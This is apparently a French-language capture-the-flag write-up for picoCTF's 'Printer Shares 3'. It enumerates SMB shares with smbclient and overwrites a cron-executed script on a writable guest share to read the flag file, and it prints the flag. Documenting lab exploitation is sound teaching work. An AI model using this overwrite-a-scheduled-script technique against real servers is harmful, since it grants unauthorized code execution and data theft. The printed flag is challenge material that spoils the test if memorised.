# Writeup PicoCTF - Printer Shares 3

**Challenge :** Printer Shares 3
**Catégorie :** Web Exploitation / Network / SMB
**Points :** 300 pts
**Flag :** `picoCTF{5mb_pr1nter_5h4re5_r3v3r53_f17d0589}`

## Description

Le challenge expose un serveur SMB avec deux partages. L'indice mentionne un "debug script" s'exécutant chaque minute, ce qui suggère une possible injection de commandes.

## Étapes de la solution

### 1. Énumération des partages

On commence par lister les partages SMB disponibles sur le serveur :

```bash
smbclient -L //dolphin-cove.picoctf.net -p 56306 -N
```

**Résultats :**

- `shares` : Public Share With Guests (Type Disk)
- `secure-shares` : Printer for internal usage only (Type Disk)

### 2. Exploration du partage public

On accède au partage `shares` sans mot de passe :

```bash
smbclient //dolphin-cove.picoctf.net/shares -p 56306 -N
```

On y trouve deux fichiers :

- `script.sh` : Le script de débogage mentionné dans l'énoncé.
- `cron.log` : Les journaux d'exécution de ce script.

En lisant `script.sh`, on confirme qu'il s'exécute périodiquement. Le partage SMB nous permet de **modifier** ce script (droits d'écriture).

### 3. Exploitation (Injection de commandes)

Puisque le script est exécuté par le système, nous pouvons y injecter nos propres commandes Linux pour explorer le serveur.

#### phase 1 : Exploration du système de fichiers

On remplace `script.sh` par un script qui liste les répertoires :

```bash
#!/bin/bash
ls -laR /challenge > output.txt 2>&1
```

Après une minute, on récupère `output.txt` et on découvre un fichier sensible :
`/challenge/secure-shares/flag.txt`

#### phase 2 : Lecture du Flag

On met à jour `script.sh` pour extraire le contenu du flag :

```bash
#!/bin/bash
cat /challenge/secure-shares/flag.txt > flag_output.txt
```

On attend à nouveau une minute, puis on télécharge `flag_output.txt`.

## Résultat

Le flag est récupéré avec succès :
`picoCTF{5mb_pr1nter_5h4re5_r3v3r53_f17d0589}`

## Concepts clés retenus

* **SMB Misconfiguration** : Les droits d'écriture sur des scripts exécutés par le système (via cron ou services) permettent une exécution de code arbitraire (RCE).
- **Lateral Movement** : Utiliser un accès initial "public" pour accéder à des données "privées" à l'intérieur du serveur.
